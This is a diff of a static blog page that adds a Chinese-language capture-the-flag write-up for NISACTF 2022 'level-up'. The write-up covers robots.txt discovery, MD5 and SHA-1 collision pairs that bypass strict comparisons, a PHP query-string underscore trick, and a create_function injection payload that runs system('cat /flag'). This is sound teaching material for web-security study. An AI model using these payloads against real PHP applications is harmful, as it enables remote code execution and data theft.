@@ -69,6 +69,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-第二周3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/21/%E7%AC%AC%E4%BA%8C%E5%91%A83/" class="article-date">
+  <time class="dt-published" datetime="2025-01-21T03:15:03.000Z" itemprop="datePublished">2025-01-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/21/%E7%AC%AC%E4%BA%8C%E5%91%A83/">第二周3</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <pre><code>题目 ： [NISACTF 2022]level-up
+</code></pre>
+<ol>
+<li><p>打开环境  如我所料  啥也没有<br>看一下源代码  有个标志“disallow”（是robots.txt文件的标志）<br>看一下robos.txt文件</p>
+</li>
+<li><pre><code class="bash">
+</code></pre>
+</li>
+</ol>
+<p>  User-agent: *<br>Disallow:<br>Disallow: level_2_1s_h3re.php<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   弹出来这个level_2_1s_h3re.php文件  看一下</span><br><span class="line"></span><br><span class="line">3. ``` bash</span><br><span class="line">   &lt;?php</span><br><span class="line">//here is level 2</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;str.php&quot;;</span><br><span class="line">if (isset($_POST[&#x27;array1&#x27;]) &amp;&amp; isset($_POST[&#x27;array2&#x27;]))&#123;</span><br><span class="line">    $a1 = (string)$_POST[&#x27;array1&#x27;];</span><br><span class="line">    $a2 = (string)$_POST[&#x27;array2&#x27;];</span><br><span class="line">    if ($a1 == $a2)&#123;</span><br><span class="line">        die(&quot;????&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (md5($a1) === md5($a2))&#123;</span><br><span class="line">        echo $level3;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;level 2 failed ...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>  发现这个代码  审计一下<br>  发现是个强比较绕过  但这个题目不能用数组<br>  用数组 $a1 &#x3D; (string)$_POST[‘array1’];<br>         $a2 &#x3D; (string)$<em>POST[‘array2’];<br>   会导致array1&#x3D;array2&#x3D;null 都为空 无法绕过<br>   这个时候可以用碰撞相等的方式<br>    array1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%<br>    6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;array2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d<br>    3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%f<br>    b%5f%07%fe%a2来绕过<br>4. 绕过后发现了 Level___3.php 文件<br>   打开文件  又发现一串php代码<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line">//here is level 3</span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (string)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (string)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sha1(<span class="variable">$a1</span>) === sha1(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$level4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;level 3 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>    代码审计一下  与上面一样都不能用数组绕过<br>    可以用array1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;<br>    Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D<br>    8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%<br>    AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W<br>    %0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D<br>    0%BF%3F%98%CD%A8%04F%29%A1&amp;array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200<br>    %20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%<br>    3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%<br>    B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C<br>    2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A<br>    8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1<br>    来进行绕过<br>    发现文件level_level_4.php文件<br>5.  打开level_level_4.php文件看一下 发现这个php代码<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?php</span><br><span class="line">//here is last level</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    include <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        die(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">        die(<span class="variable">$level5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>    简单说一下  就是用NI_SA</em>&#x3D;txw4ever 就行  但需要把_换为+<br>    否则因php代码特性会导致变量名变化<br>    得出 55_5_55.php文件<br>6.  看一下55_5_55.php文件 仍为pgp代码<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   &lt;?php</span><br><span class="line">//sorry , here is <span class="literal">true</span> last level</span><br><span class="line">//^_^</span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> “ $a(‘’,$b);”整个代码就是考察这个内容<br>create_function自带eval命令执行，因此我们需要传入$a为\create_function；<br>而对于参数$b，我们需要让它执行system()函数，用于回显flag，因此传入$b为“}system(‘cat &#x2F;flag’);&#x2F;&#x2F;”<br>  payload : a&#x3D;\create_function&amp;b&#x3D;}system(‘cat &#x2F;flag’);&#x2F;&#x2F;<br>  即可求出flag</p>
+<ol start="7">
+<li>总结：<br>这题的知识点众多  要对md5的绕过知识充分理解<br>还要对php代码特性有理解</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/21/%E7%AC%AC%E4%BA%8C%E5%91%A83/" data-id="cm65xj6mw0000sguiasqu10v4" data-title="第二周3" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-第二周2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/21/%E7%AC%AC%E4%BA%8C%E5%91%A82/" class="article-date">
@@ -521,45 +572,6 @@ echo '~'.urlencode(~'0');
 
 
   
-    <article id="post-lll" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/12/lll/" class="article-date">
-  <time class="dt-published" datetime="2025-01-12T06:45:31.000Z" itemprop="datePublished">2025-01-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/12/lll/">lll</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><img src="/w.png"><br>我看看</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/12/lll/" data-id="cm5ulxzzl00056guih6ey6azd" data-title="lll" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -596,6 +608,10 @@ echo '~'.urlencode(~'0');
       <ul>
         
           <li>
+            <a href="/2025/01/21/%E7%AC%AC%E4%BA%8C%E5%91%A83/">第二周3</a>
+          </li>
+        
+          <li>
             <a href="/2025/01/21/%E7%AC%AC%E4%BA%8C%E5%91%A82/">第二周2</a>
           </li>
         
@@ -609,10 +625,6 @@ echo '~'.urlencode(~'0');
         
           <li>
             <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A82/">第一周2</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/">第一周1</a>
           </li>
         
       </ul>
